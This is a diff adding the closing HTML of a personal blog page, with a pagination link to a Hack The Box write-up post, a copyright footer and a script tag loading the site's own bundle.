+        
+
+        <div class="pagination__buttons">
+            
+
+            
+            <span class="button next">
+                <a href="https://robscharf.github.io/writeups/october-25-2022/">
+                    <span class="button__text">HTB Easy Round-Up (Part 1): Blue, Devel, Jerry -- Write-Ups</span>
+                    <span class="button__icon">→</span>
+                </a>
+            </span>
+            
+        </div>
+    </div>
+
+
+    
+
+    
+
+  </main>
+
+            </div>
+
+            
+                <footer class="footer">
+    
+    <div class="footer__inner">
+        <div class="footer__content">
+            <span>&copy; 2023</span>
+            <a href="https://robscharf.github.io//colophon">&#9829;</a>
+            
+        </div>
+    </div>
+    
+    <div class="footer__inner">
+        <div class="footer__content">
+            
+        </div>
+    </div>
+</footer>
+  
+
+            
+        </div>
+
+        
+
+
+
+<script type="text/javascript" src="https://robscharf.github.io/bundle.min.bb2c6bc3ed452ca4759660e4020811f248bc2320081559e8a32d8b0092773852941133639d35e8370d03d3ddaa750b1edd6b343c5bd22a55d5bdeae8f648f49b.js" integrity="sha512-uyxrw&#43;1FLKR1lmDkAggR8ki8IyAIFVnooy2LAJJ3OFKUETNjnTXoNw0D092qdQse3Ws0PFvSKlXVvero9kj0mw=="></script>
+<script></script>  
+
+
+    </body>
+</html>
